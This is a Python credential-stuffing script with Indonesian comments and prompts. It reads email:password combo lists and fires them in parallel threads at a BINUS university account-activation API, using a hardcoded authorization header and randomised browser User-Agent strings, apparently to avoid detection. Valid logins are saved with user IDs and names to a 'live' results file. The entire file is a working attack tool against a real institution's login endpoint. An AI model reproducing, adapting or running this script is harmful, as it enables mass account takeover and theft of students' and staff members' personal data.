import os
import sys
import json
import random
import threading
import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# Colorama untuk warna terminal
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    os.system('pip install colorama')
    from colorama import Fore, Style, init
    init(autoreset=True)

# ==================== CONFIGURATION ====================
API_URL = "https://beeventory.binus.ac.id/connect/wp-json/showbees/v1/Account/BINUSActiveDirectory?"
AUTH_HEADER = "Basic c2hvd2JlZXNjMDBuM2N0"
BASE_URL = "https://www.binus.edu/connect/activate"
TIMEOUT = 30
# =======================================================

class Colors:
    GREEN = Fore.GREEN
    RED = Fore.RED
    YELLOW = Fore.YELLOW
    CYAN = Fore.CYAN
    WHITE = Fore.WHITE
    MAGENTA = Fore.MAGENTA
    RESET = Style.RESET_ALL

class Counter:
    """Thread-safe counter untuk statistik"""
    def __init__(self):
        self.live = 0
        self.die = 0
        self.error = 0
        self.checked = 0
        self.total = 0
        self.lock = threading.Lock()
    
    def add_live(self):
        with self.lock:
            self.live += 1
            self.checked += 1
    
    def add_die(self):
        with self.lock:
            self.die += 1
            self.checked += 1
    
    def add_error(self):
        with self.lock:
            self.error += 1
            self.checked += 1
    
    def get_stats(self):
        with self.lock:
            return {
                'live': self.live,
                'die': self.die,
                'error': self.error,
                'checked': self.checked,
                'total': self.total
            }

class UserAgentGenerator:
    """Generator User-Agent random"""
    
    CHROME_VERSIONS = list(range(100, 145))
    FIREFOX_VERSIONS = list(range(90, 130))
    
    WINDOWS_VERSIONS = [
        "Windows NT 10.0; Win64; x64",
        "Windows NT 10.0; WOW64",
        "Windows NT 11.0; Win64; x64",
    ]
    
    MAC_VERSIONS = [
        "Macintosh; Intel Mac OS X 10_15_7",
        "Macintosh; Intel Mac OS X 11_0_0",
        "Macintosh; Intel Mac OS X 12_0_0",
        "Macintosh; Intel Mac OS X 13_0_0",
        "Macintosh; Intel Mac OS X 14_0_0",
    ]
    
    LINUX_VERSIONS = [
        "X11; Linux x86_64",
        "X11; Ubuntu; Linux x86_64",
    ]
    
    @classmethod
    def generate(cls):
        browser_type = random.choice(['chrome', 'chrome', 'chrome', 'firefox'])  # Chrome lebih banyak
        os_type = random.choice(['windows', 'windows', 'windows', 'mac', 'linux'])  # Windows lebih banyak
        
        if os_type == 'windows':
            os_string = random.choice(cls.WINDOWS_VERSIONS)
        elif os_type == 'mac':
            os_string = random.choice(cls.MAC_VERSIONS)
        else:
            os_string = random.choice(cls.LINUX_VERSIONS)
        
        if browser_type == 'chrome':
            version = random.choice(cls.CHROME_VERSIONS)
            build = random.randint(1000, 9999)
            patch = random.randint(0, 999)
            return f"Mozilla/5.0 ({os_string}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.{build}.{patch} Safari/537.36"
        else:
            version = random.choice(cls.FIREFOX_VERSIONS)
            return f"Mozilla/5.0 ({os_string}; rv:{version}.0) Gecko/20100101 Firefox/{version}.0"

class BinusChecker:
    def __init__(self, threads=10):
        self.threads = threads
        self.counter = Counter()
        self.print_lock = threading.Lock()
        self.file_lock = threading.Lock()
        self.session = requests.Session()
        
    def banner(self):
        banner = f"""
{Colors.CYAN}╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║   ██████╗ ██╗███╗   ██╗██╗   ██╗███████╗                      ║
║   ██╔══██╗██║████╗  ██║██║   ██║██╔════╝                      ║
║   ██████╔╝██║██╔██╗ ██║██║   ██║███████╗                      ║
║   ██╔══██╗██║██║╚██╗██║██║   ██║╚════██║                      ║
║   ██████╔╝██║██║ ╚████║╚██████╔╝███████║                      ║
║   ╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝                      ║
║                                                               ║
║   {Colors.WHITE}CREDENTIAL CHECKER - MULTI THREADED{Colors.CYAN}                        ║
║   {Colors.YELLOW}Author: Python Script{Colors.CYAN}                                      ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝{Colors.RESET}
"""
        print(banner)
    
    def find_txt_files(self):
        """Cari semua file .txt di folder yang sama"""
        txt_files = []
        current_dir = os.path.dirname(os.path.abspath(__file__))
        if not current_dir:
            current_dir = '.'
        
        for file in os.listdir(current_dir):
            if file.endswith('.txt') and file.lower() != 'live_binus.txt':
                file_path = os.path.join(current_dir, file)
                try:
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        line_count = sum(1 for line in f if ':' in line)
                    if line_count > 0:
                        txt_files.append((file, line_count))
                except:
                    continue
        
        return txt_files
    
    def select_file(self, txt_files):
        """Pilih file combo"""
        print(f"\n{Colors.CYAN}[*] File combo yang tersedia:{Colors.RESET}\n")
        print(f"    {Colors.WHITE}{'No.':<5} {'Nama File':<40} {'Jumlah Combo':<15}{Colors.RESET}")
        print(f"    {'-'*60}")
        
        for i, (file, count) in enumerate(txt_files, 1):
            print(f"    {Colors.YELLOW}[{i}]{Colors.RESET}   {Colors.WHITE}{file:<40}{Colors.GREEN}{count:,} lines{Colors.RESET}")
        
        while True:
            try:
                choice = input(f"\n{Colors.CYAN}[?] Pilih nomor file (1-{len(txt_files)}): {Colors.RESET}")
                choice = int(choice)
                if 1 <= choice <= len(txt_files):
                    return txt_files[choice - 1][0]
                else:
                    print(f"{Colors.RED}[!] Pilihan tidak valid!{Colors.RESET}")
            except ValueError:
                print(f"{Colors.RED}[!] Masukkan angka yang valid!{Colors.RESET}")
    
    def load_combos(self, filename):
        """Load combo dan hapus duplikat"""
        combos = []
        
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if ':' in line and line:
                    combos.append(line)
        
        original_count = len(combos)
        
        # Hapus duplikat dengan mempertahankan urutan
        seen = set()
        unique_combos = []
        for combo in combos:
            if combo.lower() not in seen:
                seen.add(combo.lower())
                unique_combos.append(combo)
        
        duplicate_count = original_count - len(unique_combos)
        
        return unique_combos, original_count, duplicate_count
    
    def get_headers(self):
        """Generate headers dengan random User-Agent"""
        ua = UserAgentGenerator.generate()
        chrome_ver = random.randint(100, 144)
        
        return {
            "Host": "beeventory.binus.ac.id",
            "Connection": "keep-alive",
            "sec-ch-ua-platform": "\"Windows\"",
            "Authorization": AUTH_HEADER,
            "User-Agent": ua,
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "sec-ch-ua": f"\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"{chrome_ver}\", \"Google Chrome\";v=\"{chrome_ver}\"",
            "Content-Type": "application/json",
            "sec-ch-ua-mobile": "?0",
            "Origin": "https://www.binus.edu",
            "Sec-Fetch-Site": "cross-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://www.binus.edu/",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9,id-ID;q=0.8,id;q=0.7"
        }
    
    def check_account(self, combo):
        """Check single account"""
        try:
            parts = combo.split(':', 1)
            if len(parts) != 2:
                self.counter.add_error()
                return
            
            email = parts[0].strip()
            password = parts[1].strip()
            
            if not email or not password:
                self.counter.add_error()
                return
            
            payload = {
                "email": email,
                "password": password,
                "base_url": BASE_URL
            }
            
            headers = self.get_headers()
            
            response = requests.post(
                API_URL,
                headers=headers,
                json=payload,
                timeout=TIMEOUT,
                verify=True
            )
            
            stats = self.counter.get_stats()
            progress = f"[{stats['checked']}/{stats['total']}]"
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    
                    if data.get('code') == 200 and 'user' in data:
                        # LIVE
                        user = data['user']
                        user_id = user.get('UserID', 'N/A')
                        user_name = user.get('UserName', 'N/A')
                        user_first_name = user.get('UserFirstName', 'N/A')
                        user_email = user.get('UserEmail', email)
                        
                        self.counter.add_live()
                        
                        # Format output
                        live_info = f"{email}:{password} | UserID: {user_id} | UserName: {user_name} | Name: {user_first_name}"
                        
                        with self.print_lock:
                            print(f"{Colors.GREEN}[LIVE] {progress} {live_info}{Colors.RESET}")
                        
                        # Save ke file
                        with self.file_lock:
                            with open('live_binus.txt', 'a', encoding='utf-8') as f:
                                f.write(f"{live_info}\n")
                    else:
                        # DIE
                        self.counter.add_die()
                        with self.print_lock:
                            print(f"{Colors.RED}[DIE] {progress} {email}:{password}{Colors.RESET}")
                
                except json.JSONDecodeError:
                    self.counter.add_die()
                    with self.print_lock:
                        print(f"{Colors.RED}[DIE] {progress} {email}:{password}{Colors.RESET}")
            
            elif response.status_code == 401:
                # Unauthorized - DIE
                self.counter.add_die()
                with self.print_lock:
                    print(f"{Colors.RED}[DIE] {progress} {email}:{password}{Colors.RESET}")
            
            else:
                self.counter.add_error()
                with self.print_lock:
                    print(f"{Colors.YELLOW}[ERROR] {progress} {email}:{password} - HTTP {response.status_code}{Colors.RESET}")
        
        except requests.exceptions.Timeout:
            self.counter.add_error()
            with self.print_lock:
                stats = self.counter.get_stats()
                print(f"{Colors.YELLOW}[TIMEOUT] [{stats['checked']}/{stats['total']}] {combo.split(':')[0]}{Colors.RESET}")
        
        except requests.exceptions.RequestException as e:
            self.counter.add_error()
            with self.print_lock:
                stats = self.counter.get_stats()
                print(f"{Colors.YELLOW}[ERROR] [{stats['checked']}/{stats['total']}] {combo.split(':')[0]} - {str(e)[:50]}{Colors.RESET}")
        
        except Exception as e:
            self.counter.add_error()
    
    def run(self):
        """Main function"""
        self.banner()
        
        # Cari file txt
        txt_files = self.find_txt_files()
        
        if not txt_files:
            print(f"{Colors.RED}[!] Tidak ada file .txt dengan format combo (email:password) ditemukan!{Colors.RESET}")
            print(f"{Colors.YELLOW}[*] Pastikan file combo ada di folder yang sama dengan script ini.{Colors.RESET}")
            input(f"\n{Colors.CYAN}Tekan Enter untuk keluar...{Colors.RESET}")
            return
        
        # Pilih file
        selected_file = self.select_file(txt_files)
        
        # Load combo
        print(f"\n{Colors.CYAN}[*] Loading combos dari {selected_file}...{Colors.RESET}")
        combos, original, duplicates = self.load_combos(selected_file)
        
        if not combos:
            print(f"{Colors.RED}[!] Tidak ada combo valid ditemukan!{Colors.RESET}")
            return
        
        print(f"{Colors.GREEN}[+] Total combo: {original:,}{Colors.RESET}")
        print(f"{Colors.YELLOW}[+] Duplikat dihapus: {duplicates:,}{Colors.RESET}")
        print(f"{Colors.CYAN}[+] Combo unik: {len(combos):,}{Colors.RESET}")
        
        # Input thread
        while True:
            try:
                thread_input = input(f"\n{Colors.CYAN}[?] Jumlah threads (rekomendasi 10-50): {Colors.RESET}")
                self.threads = int(thread_input)
                if self.threads > 0:
                    break
                print(f"{Colors.RED}[!] Thread harus lebih dari 0!{Colors.RESET}")
            except ValueError:
                print(f"{Colors.RED}[!] Masukkan angka yang valid!{Colors.RESET}")
        
        # Set total counter
        self.counter.total = len(combos)
        
        # Clear/create live file
        with open('live_binus.txt', 'w', encoding='utf-8') as f:
            f.write(f"# BINUS Live Results - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"# Source: {selected_file}\n")
            f.write(f"# Total checked: {len(combos)}\n")
            f.write("-" * 80 + "\n")
        
        print(f"\n{Colors.CYAN}[*] Memulai checker dengan {self.threads} threads...{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Target: {API_URL}{Colors.RESET}")
        print(f"{Colors.YELLOW}{'='*70}{Colors.RESET}\n")
        
        start_time = time.time()
        
        # Run dengan ThreadPoolExecutor
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self.check_account, combo) for combo in combos]
            
            # Wait for all to complete
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    pass
        
        elapsed_time = time.time() - start_time
        stats = self.counter.get_stats()
        
        # Print hasil akhir
        print(f"\n{Colors.YELLOW}{'='*70}{Colors.RESET}")
        print(f"""
{Colors.CYAN}╔═══════════════════════════════════════════════════════════════╗
║                      HASIL CHECKING                           ║
╠═══════════════════════════════════════════════════════════════╣
║                                                               ║
║   {Colors.GREEN}✓ LIVE    : {stats['live']:<10}{Colors.CYAN}                                   ║
║   {Colors.RED}✗ DIE     : {stats['die']:<10}{Colors.CYAN}                                   ║
║   {Colors.YELLOW}⚠ ERROR   : {stats['error']:<10}{Colors.CYAN}                                   ║
║   {Colors.WHITE}○ TOTAL   : {stats['total']:<10}{Colors.CYAN}                                   ║
║                                                               ║
║   ⏱ Waktu  : {elapsed_time:.2f} detik                                   ║
║   ⚡ Speed  : {stats['total']/elapsed_time:.2f} combo/detik                              ║
║                                                               ║
╠═══════════════════════════════════════════════════════════════╣
║   {Colors.GREEN}📁 Live disimpan ke: live_binus.txt{Colors.CYAN}                          ║
╚═══════════════════════════════════════════════════════════════╝{Colors.RESET}
""")
        
        # Update header file dengan stats final
        try:
            with open('live_binus.txt', 'r', encoding='utf-8') as f:
                content = f.read()
            
            with open('live_binus.txt', 'w', encoding='utf-8') as f:
                f.write(f"# BINUS Live Results - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"# Source: {selected_file}\n")
                f.write(f"# Total checked: {stats['total']} | Live: {stats['live']} | Die: {stats['die']} | Error: {stats['error']}\n")
                f.write("-" * 80 + "\n")
                # Write existing content (skip old headers)
                lines = content.split('\n')
                for line in lines:
                    if not line.startswith('#') and not line.startswith('-') and line.strip():
                        f.write(line + '\n')
        except:
            pass
        
        input(f"\n{Colors.CYAN}Tekan Enter untuk keluar...{Colors.RESET}")

def main():
    try:
        checker = BinusChecker()
        checker.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Dihentikan oleh user{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"{Colors.RED}[!] Error: {str(e)}{Colors.RESET}")
        input(f"\n{Colors.CYAN}Tekan Enter untuk keluar...{Colors.RESET}")

if __name__ == "__main__":
    main()